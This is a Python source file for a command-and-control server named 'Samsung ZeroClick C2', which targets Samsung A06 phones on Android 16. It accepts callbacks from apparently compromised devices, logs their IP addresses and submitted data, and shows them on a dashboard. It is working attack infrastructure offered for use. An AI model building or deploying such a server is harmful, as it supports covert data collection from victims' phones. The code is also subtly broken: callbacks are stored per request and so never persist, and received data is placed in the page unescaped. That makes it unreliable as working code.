# core/c2.py — C2 Server

import json
import time
import http.server
from datetime import datetime
from urllib.parse import parse_qs, urlparse

class C2Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.callbacks = []
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == '/':
            self._send_html(self._dashboard())
        elif parsed.path == '/ping':
            self._send_response('pong')
        elif parsed.path == '/callbacks':
            self._send_json(self.callbacks)
        elif parsed.path == '/callback':
            params = parse_qs(parsed.query)
            self._process_callback(params)
            self._send_response('OK')
        else:
            self._send_response('C2 Server Running')
    
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length)
        try:
            info = json.loads(data)
        except:
            info = {'raw': data.decode('utf-8', errors='ignore')}
        
        if self.path == '/callback':
            self._process_callback(info)
            self._send_response('OK')
        else:
            self._send_response('Error')
    
    def _process_callback(self, data):
        callback = {
            'timestamp': datetime.now().isoformat(),
            'ip': self.client_address[0],
            'data': data
        }
        self.callbacks.append(callback)
        if len(self.callbacks) > 1000:
            self.callbacks = self.callbacks[-1000:]
        print(f"[C2] Callback from {self.client_address[0]}: {data}")
    
    def _send_response(self, text):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(text.encode())
    
    def _send_json(self, data):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def _send_html(self, html):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def _dashboard(self):
        callbacks_html = ''.join([
            f'<tr><td>{c["timestamp"]}</td><td>{c["ip"]}</td><td><pre>{json.dumps(c["data"], indent=2)[:200]}</pre></td></tr>'
            for c in self.callbacks[-10:]
        ]) or '<tr><td colspan="3">No callbacks yet</td></tr>'
        
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Samsung ZeroClick C2</title>
            <style>
                *{{margin:0;padding:0;box-sizing:border-box}}
                body{{background:#0a1a2b;color:#fff;font-family:sans-serif;padding:20px}}
                .container{{max-width:1200px;margin:0 auto}}
                h1{{color:#4a9eff}}
                .stats{{display:flex;gap:20px;margin:20px 0;flex-wrap:wrap}}
                .stat{{background:#17212b;padding:16px 24px;border-radius:12px;flex:1;min-width:120px}}
                .stat .num{{font-size:28px;font-weight:bold;color:#4a9eff}}
                .stat .label{{color:#8ea4b8;font-size:13px}}
                table{{width:100%;background:#17212b;border-radius:12px;overflow:hidden;margin:10px 0}}
                th{{background:#1c2c3c;padding:12px;text-align:left;color:#8ea4b8;font-weight:400}}
                td{{padding:12px;border-bottom:1px solid #1c2c3c;font-size:13px}}
                .refresh{{background:#4a9eff;color:#fff;border:none;padding:8px 20px;border-radius:8px;cursor:pointer}}
                .footer{{margin-top:40px;color:#6f8ba5;font-size:12px;text-align:center}}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🎯 Samsung ZeroClick C2</h1>
                <p style="color:#8ea4b8">Target: Samsung A06 — Android 16</p>
                
                <div class="stats">
                    <div class="stat"><div class="num">{len(self.callbacks)}</div><div class="label">Callbacks</div></div>
                    <div class="stat"><div class="num">{self.callbacks[-1]['ip'] if self.callbacks else 'N/A'}</div><div class="label">Last IP</div></div>
                    <div class="stat"><div class="num">{self.callbacks[-1]['timestamp'][:19] if self.callbacks else 'N/A'}</div><div class="label">Last Callback</div></div>
                </div>
                
                <h2>📩 Callbacks</h2>
                <table>
                    <tr><th>Time</th><th>IP</th><th>Data</th></tr>
                    {callbacks_html}
                </table>
                
                <div style="margin-top:20px">
                    <button class="refresh" onclick="location.reload()">🔄 Refresh</button>
                </div>
                <div class="footer">ZeroClick Samsung — Made in Ethiopia 🇪🇹</div>
            </div>
        </body>
        </html>
        """
    
    def log_message(self, *args): pass

class C2Server:
    def __init__(self, host='0.0.0.0', port=8080):
        self.host = host
        self.port = port
    
    def run(self):
        print(f"[C2] Server running on http://{self.host}:{self.port}")
        print(f"[C2] Callback endpoint: http://{self.host}:{self.port}/callback")
        server = http.server.HTTPServer((self.host, self.port), C2Handler)
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print("[C2] Shutting down...")
            server.shutdown()